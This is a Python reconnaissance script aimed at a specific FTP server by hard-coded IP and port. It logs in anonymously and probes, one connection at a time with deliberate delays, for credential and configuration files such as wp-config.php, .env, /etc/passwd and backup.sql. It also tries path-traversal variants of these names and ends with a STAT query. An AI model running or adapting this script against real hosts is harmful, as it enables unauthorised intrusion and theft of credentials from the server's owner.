#!/usr/bin/env python3
"""Slow targeted FTP enumeration - one file per connection."""
import ftplib
import time
import socket

HOST = "103.160.107.175"
PORT = 6969
MAP = "/home/ubuntu/iptvgear.site/recon/active/ftp_filesystem.txt"

def log(msg=""):
    with open(MAP, "a") as f:
        f.write(msg + "\n")
    print(msg)

def check_file(filename):
    """Open a new connection, send one MDTM, close."""
    try:
        ftp = ftplib.FTP()
        ftp.connect(HOST, PORT, timeout=10)
        ftp.login("anonymous", "anonymous@test.com")
        try:
            resp = ftp.sendcmd(f"MDTM {filename}")
            log(f"MDTM {filename}: {resp.strip()}")
            return resp
        except Exception as e:
            err = str(e)
            if "550" not in err and "500" not in err and "501" not in err:
                log(f"MDTM {filename}: {err.strip()}")
        ftp.quit()
    except Exception as e:
        log(f"Conn {filename}: {e}")
    time.sleep(3)  # 3 second delay between connections

log(f"\n{'='*70}")
log("SLOW TARGETED CHECK - 3s delay between commands")
log(f"{'='*70}")

# Most critical files first
critical = [
    "wp-config.php",
    "/wp-config.php",
    "FTP-shared/wp-config.php",
    "root/wp-config.php",
    ".env",
    "/.env",
    "index.php",
    "/index.php",
    "index.html",
    "config.php",
    "configuration.php",
    "db.php",
    "backup.sql",
    ".htaccess",
    "composer.json",
    "passwd",
    "/etc/passwd",
    "phpinfo.php",
    "info.php",
    "test.php",
    "../wp-config.php",
    "../../wp-config.php",
    "../../../wp-config.php",
    "www/wp-config.php",
    "html/wp-config.php",
    "public_html/wp-config.php",
    "httpdocs/wp-config.php",
]

for f in critical:
    check_file(f)

# And try a STAT with long delay
log(f"\n--- FINAL STAT ---")
time.sleep(5)
try:
    ftp = ftplib.FTP()
    ftp.connect(HOST, PORT, timeout=10)
    ftp.login("anonymous", "anonymous@test.com")
    resp = ftp.sendcmd("STAT")
    log(f"STAT:\n{resp}")
    ftp.quit()
except Exception as e:
    log(f"STAT error: {e}")

log(f"\n{'='*70}")
log("COMPLETE")
log(f"{'='*70}")